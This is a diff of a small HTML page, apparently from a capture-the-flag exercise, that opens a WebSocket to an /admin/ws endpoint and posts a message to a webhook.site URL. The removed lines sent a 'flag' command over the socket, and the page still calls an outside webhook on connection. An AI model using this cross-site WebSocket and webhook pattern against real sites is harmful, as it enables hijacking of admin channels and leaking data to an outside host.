@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket Feedback to Webhook</title>
+    <title>WebSocket Debug and Feedback</title>
 </head>
 <body>
-    <h1>WebSocket Feedback - Post to Webhook</h1>
+    <h1>WebSocket Debug - Post to Webhook on Connect</h1>
 
     <script>
         // Create a new WebSocket connection to /admin/ws
@@ -16,21 +16,16 @@
         socket.onopen = function() {
             console.log('WebSocket connected');
             
-            // Automatically send the 'flag' command to retrieve the flag
-            socket.send('flag');
-            console.log('Sent command: flag');
-            
-            // Post a feedback request to the webhook URL
+            // Send feedback to the webhook when WebSocket connection is successful
             sendFeedbackToWebhook();
         };
 
         // Event handler for receiving messages from the WebSocket
         socket.onmessage = function(event) {
             console.log('Message from server: ', event.data);
-            // You can ignore the WebSocket response if you don't need the flag.
         };
 
-        // Function to send a feedback to the webhook (without flag data)
+        // Function to send feedback to the webhook (on WebSocket connection)
         function sendFeedbackToWebhook() {
             fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a', {
                 method: 'POST',
@@ -38,7 +33,7 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    feedback: 'Sent flag command via WebSocket.'
+                    feedback: 'WebSocket connection established successfully.'
                 })
             })
             .then(response => response.json())
